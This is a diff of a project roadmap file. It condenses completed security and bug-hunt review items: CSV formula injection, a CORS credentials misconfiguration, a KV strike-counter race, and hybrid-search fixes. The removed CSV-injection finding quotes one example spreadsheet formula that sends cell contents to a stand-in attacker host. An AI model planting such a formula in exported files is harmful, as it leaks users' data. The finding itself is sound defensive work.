@@ -10,10 +10,11 @@ every task cites the spec section it implements. If a task and the
 spec disagree, the spec wins and this file gets corrected.
 
 **Status summary (last updated 2026-08-17):** All originally scoped
-milestones (Phase 0 → R, G.1–G.5) are shipped and verified. Full
-narrative/evidence for completed work lives in git history and
-`CHANGELOG.md` — this file keeps only short landed-summaries plus the
-items still genuinely open below.
+milestones (Phase 0 → R, G.1–G.5) plus two later code-review/bug-hunt
+passes (S, U) are shipped and verified. Full narrative/evidence for
+completed work lives in git history and `CHANGELOG.md` — this file
+keeps only short landed-summaries plus the items still genuinely open
+below.
 
 **Open-item count: 8**:
 1. G.3 — root cause found and fixed in code (`SubrequestBudget`),
@@ -31,6 +32,9 @@ items still genuinely open below.
 
 S.1–S.3 (2026-08-16 code-review findings) fixed and verified
 2026-08-17 — see "Shipped milestones" below and CHANGELOG.md.
+
+U.1–U.4 (2026-08-17 hybrid-search/query-schema bug hunt) fixed and
+verified 2026-08-17 — see "Shipped milestones" below and CHANGELOG.md.
 
 ---
 
@@ -119,6 +123,24 @@ S.1–S.3 (2026-08-16 code-review findings) fixed and verified
   Last-Modified/304 support (R.2), `hs feed-url` for discoverability
   (R.3).
 
+- **S — Security/data-integrity code-review pass (`apps/api`,
+  `packages/db`, `packages/adapters`).** 3 issues found and fixed
+  2026-08-17: CSV export formula-injection (S.1), CORS reflected-
+  origin + credentials misconfiguration plus an adjacent OPTIONS-
+  preflight bug found in the same file (S.2), admin-auth strike-
+  counter KV race (S.3). Full detail in CHANGELOG.md.
+
+- **U — Hybrid-search / query-schema bug hunt.** 4 issues found and
+  fixed 2026-08-17, starting from a prior trends-CLI investigation:
+  missing regression coverage for an already-fixed CLI bug (U.1);
+  `signalsQuerySchema.roles` silently treating an empty `--role` as
+  "no filter" instead of erroring (U.2), duplicated unfixed on the
+  public HTTP export/feed routes (U.3); and a semantic-search ranking
+  bug where every hybrid-search result got the same similarity score
+  regardless of which job actually matched (U.4), root-fixed via a
+  new `matched_job_id` field on `findSignalsByJobIds`. Full detail in
+  CHANGELOG.md.
+
 ---
 
 ## Open work
@@ -204,88 +226,6 @@ live-D1/manual-only.
       a separate preview/staging tier — but kept here as an explicit
       constraint in case that decision is ever revisited. Not a task
       to schedule.
-
-### S — code review findings (2026-08-16, security/data-integrity pass) — fixed 2026-08-17
-
-Three issues found during a manual review of `apps/api`, `packages/db`,
-and `packages/adapters` (not tied to a prior incident — proactive pass).
-All three map to spec §11.1's own stated bar ("Escape/sanitize untrusted
-job descriptions," "appropriate...headers," general security-controls
-list), so these are drift from the spec, not new scope. All three fixed
-and verified 2026-08-17 (`pnpm -r typecheck` / `pnpm -r lint` clean
-across all 8 workspace packages; new + existing test suites passing —
-see CHANGELOG.md for the per-item verification detail). While fixing
-S.2, also found and fixed an adjacent, more serious bug in the same
-code path: `security-headers.ts`'s CORS reflection headers were being
-set via `c.header()` *after* the OPTIONS branch had already returned a
-finalized `Response`, so real cross-origin preflights never actually
-received `Access-Control-Allow-Origin` at all — see CHANGELOG.md.
-
-- [x] **S.1 — CSV export is vulnerable to formula injection.**
-      `lib/text/csv.ts`'s `escapeCsvField` only implements RFC 4180
-      quoting (comma/quote/newline). It does not neutralize a leading
-      `=`, `+`, `-`, `@`, tab, or CR, which Excel/Sheets/LibreOffice
-      treat as a formula trigger on cell open — a documented,
-      named vulnerability class (CSV injection, OWASP). `company_display_name`
-      and `headline` (exported via `apps/api/src/routes/export.ts`'s
-      `GET /api/v1/export/signals.csv`) both trace to unsanitized
-      upstream ATS data — confirmed via `packages/adapters/src/greenhouse.ts`,
-      where `title: job.title` passes through with only `z.string()`
-      validation, no content restriction. Any company listed on a
-      source ATS can set its own display name or a job title to a
-      formula string (e.g. `=HYPERLINK("http://evil/"&A1,"click")`),
-      and it reaches the exported CSV verbatim; anyone opening the file
-      in Excel gets a live formula, not text.
-      Fix: in `escapeCsvField`, prefix fields whose first character is
-      `=`, `+`, `-`, `@`, tab, or CR with a leading `'` before the
-      existing RFC-4180 quoting logic runs. Add a fixture test with a
-      `=`-leading company name asserting the output cell is
-      neutralized.
-- [x] **S.2 — CORS reflects any Origin *and* sets
-      `Access-Control-Allow-Credentials: true`.**
-      `apps/api/src/middleware/security-headers.ts`'s `securityHeaders()`
-      reflects the request's `Origin` header verbatim (by design,
-      per that file's own comment — this API is intentionally
-      open-access, spec §11.1) but also unconditionally sets
-      `Access-Control-Allow-Credentials: true` whenever an `Origin`
-      header is present. Reflected-origin + credentials=true is the
-      specific pattern used to defeat the browser's own wildcard+
-      credentials block — inert today since no route sets cookies or
-      reads an Authorization header from a browser context, but a
-      landmine: the day any credentialed flow is added to this Worker,
-      every origin on the internet becomes a trusted credentialed
-      reader of that response, and nothing about this file's current
-      shape would flag it as newly dangerous.
-      Fix: remove the unconditional
-      `c.header("Access-Control-Allow-Credentials", "true")` line.
-      Reflecting Origin alone is fine for a public, unauthenticated
-      API — only the combination with credentials=true is the problem.
-      Re-add credentials=true only alongside whatever future change
-      actually introduces a credentialed route, scoped to real
-      allowed origins at that point, not blanket reflection.
-- [x] **S.3 — Admin-auth strike counter has an unprotected
-      read-then-write race.** `apps/api/src/middleware/admin-auth.ts`'s
-      `addStrike` does a bare `kv.get` (via `loadStrikes`) followed by
-      a plain `kv.put(strikes + 1, ...)` with no atomicity between the
-      two. `lib/http/rate-limit.ts`'s `checkRateLimit` — used one
-      layer over in `middleware/anti-abuse.ts` — already documents
-      this exact KV get→put race in its own header comment and closes
-      it via `incrementActiveShard` (uses the KV runtime's atomic
-      `increment` where available, falls back to a bounded-loss client
-      put otherwise). `admin-auth.ts` predates or was never updated to
-      match that fix. Effect: a burst of concurrent wrong-password
-      attempts from the same IP can read the same prior `strikes`
-      value before any of them write, undercounting strikes and
-      stretching the 3-attempt/60s lockout past its intended
-      threshold. Low severity on its own (ADMIN_SECRET is still
-      constant-time compared regardless — see
-      `timingSafeEqualStrings` — so this only weakens brute-force
-      throttling, not the credential check itself), but it's a real
-      gap between two files that clearly already know about the same
-      problem class.
-      Fix: route `addStrike` through `incrementActiveShard` (or call
-      `checkRateLimit` directly with an admin-specific
-      `RateLimitParams`) instead of the current raw `kv.put`.
 
 ### T — `apps/cli` code review findings (2026-08-17, --watch / company-watchlist pass)
 
